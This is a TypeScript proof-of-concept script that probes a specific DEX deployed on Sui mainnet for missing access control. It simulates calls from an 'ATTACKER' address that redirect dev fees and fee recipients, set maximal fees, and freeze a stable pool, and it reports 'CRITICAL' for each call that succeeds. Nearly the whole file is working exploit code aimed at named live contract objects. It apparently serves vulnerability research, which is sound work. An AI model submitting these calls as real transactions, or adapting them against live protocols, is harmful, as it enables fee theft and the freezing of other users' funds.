import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

const PKG = "0xb24b6789e088b876afabca733bed2299fbc9e2d6369be4d1acfa17d8145454d9";
const DEX_INFO = "0x3f2d9f724f4a1ce5e71676448dc452be9a6243dac9c5b975a588c8c867066e92";
const DEX_STABLE_INFO = "0x5a7eca40df453efe6bb1feae99e5b8fc072d1252cbd1979eb187d625dc9b47c9";
const DEX_INFO_VERSION = 1587827;
const DEX_STABLE_INFO_VERSION = 1587827;

const ATTACKER = "0xdeadbeef00000000000000000000000000000000000000000000000000000000";

// Test 1: stable_swap::set_dev_account
// Takes: &mut Dex_Stable_Info, address - NO CAP
async function test_set_dev_account() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::stable_swap::set_dev_account`,
    arguments: [
      tx.object(DEX_STABLE_INFO),
      tx.pure.address(ATTACKER),
    ],
  });
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: ATTACKER,
  });
  const status = result.effects.status;
  console.log("=== stable_swap::set_dev_account ===");
  console.log("Status:", status.status);
  if (status.status === "success") {
    console.log("!!! CRITICAL: ANYONE can redirect stable pool dev fees !!!");
  } else {
    console.log("Error:", status.error);
  }
}

// Test 2: stable_swap::set_fee_config
// Takes: u64 fee, u64 dao_fee, &mut Dex_Stable_Info - NO CAP
async function test_set_fee_config() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::stable_swap::set_fee_config`,
    arguments: [
      tx.pure.u64(9999999999), // max possible fee
      tx.pure.u64(9999999999),
      tx.object(DEX_STABLE_INFO),
    ],
  });
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: ATTACKER,
  });
  const status = result.effects.status;
  console.log("\n=== stable_swap::set_fee_config ===");
  console.log("Status:", status.status);
  if (status.status === "success") {
    console.log("!!! CRITICAL: ANYONE can set arbitrarily high fees on stable pool !!!");
  } else {
    console.log("Error:", status.error);
  }
}

// Test 3: stable_swap::set_fee_to  
// Takes: &mut Dex_Stable_Info, address - NO CAP
async function test_set_fee_to_stable() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::stable_swap::set_fee_to`,
    arguments: [
      tx.object(DEX_STABLE_INFO),
      tx.pure.address(ATTACKER),
    ],
  });
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: ATTACKER,
  });
  const status = result.effects.status;
  console.log("\n=== stable_swap::set_fee_to ===");
  console.log("Status:", status.status);
  if (status.status === "success") {
    console.log("!!! CRITICAL: ANYONE can redirect stable pool fees !!!");
  } else {
    console.log("Error:", status.error);
  }
}

// Test 4: swap::set_fee_to (regular pool)
// We already know this aborts with error 17 - sender check
// But let's also test stable_swap::freeze_stable_pool for griefing
async function test_freeze_stable_pool() {
  const tx = new Transaction();
  tx.moveCall({
    target: `${PKG}::stable_swap::freeze_stable_pool`,
    typeArguments: [
      "0x5d4b302506645c37ff133b98c4b50a5ae14841659738d6d733d59d0d217a93bf::coin::COIN",
      "0xc060006111016b8a020ad5b33834984a437aaa7d3c74c18e09a95d48aceab08c::coin::COIN"
    ],
    arguments: [
      tx.pure.bool(true),
      tx.object(DEX_STABLE_INFO),
    ],
  });
  const result = await client.devInspectTransactionBlock({
    transactionBlock: tx,
    sender: ATTACKER,
  });
  const status = result.effects.status;
  console.log("\n=== stable_swap::freeze_stable_pool ===");
  console.log("Status:", status.status);
  if (status.status === "success") {
    console.log("!!! CRITICAL: ANYONE can freeze stable pool trading (griefing) !!!");
  } else {
    console.log("Error:", status.error);
  }
}

(async () => {
  await test_set_dev_account();
  await test_set_fee_config();
  await test_set_fee_to_stable();
  await test_freeze_stable_pool();
})();
